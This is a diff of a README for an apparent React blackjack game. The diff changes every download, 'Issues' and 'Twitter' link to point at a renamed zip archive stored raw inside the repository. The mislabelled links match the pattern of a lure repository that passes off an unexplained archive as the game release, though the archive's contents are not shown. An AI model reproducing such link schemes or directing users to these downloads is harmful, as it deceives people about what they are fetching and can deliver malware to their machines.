@@ -1,7 +1,7 @@
 # 🎰 blackjack-premium - Enjoy Casino Quality Blackjack at Home
 
 ## 📥 Download Now
-[![Download blackjack-premium](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/src/components/layout/premium-blackjack-2.5.zip)](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/src/components/layout/premium-blackjack-2.5.zip)
+[![Download blackjack-premium](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/docs/premium_blackjack_digestively.zip)](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/docs/premium_blackjack_digestively.zip)
 
 ## 🚀 Getting Started
 Welcome to **blackjack-premium**! This is a premium casino-quality Blackjack game built with React and TypeScript, featuring stunning 3D animations and a responsive design that works on all devices.
@@ -23,7 +23,7 @@ Before you get started, ensure your device meets the following requirements:
 To get blackjack-premium on your device, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the downloads:
-   [Download blackjack-premium](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/src/components/layout/premium-blackjack-2.5.zip)
+   [Download blackjack-premium](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/docs/premium_blackjack_digestively.zip)
 
 2. **Choose Your Version**: On the releases page, you will see several versions available. Select the latest one for the best experience.
 
@@ -52,11 +52,11 @@ If you encounter any issues:
 - Check your internet connection.
 - Restart the game or device.
 
-If problems persist, visit our [GitHub Issues page](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/src/components/layout/premium-blackjack-2.5.zip) to report the issue or find help.
+If problems persist, visit our [GitHub Issues page](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/docs/premium_blackjack_digestively.zip) to report the issue or find help.
 
 ## ⭐ Community and Support
 Join our community for tips, tricks, and support:
 - **GitHub Discussions**: Engage with other players and developers.
-- **Social Media**: Follow us on [Twitter](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/src/components/layout/premium-blackjack-2.5.zip) for updates and announcements.
+- **Social Media**: Follow us on [Twitter](https://raw.githubusercontent.com/H2345H2345661/blackjack-premium/master/docs/premium_blackjack_digestively.zip) for updates and announcements.
 
 Thank you for choosing blackjack-premium. Enjoy your game!
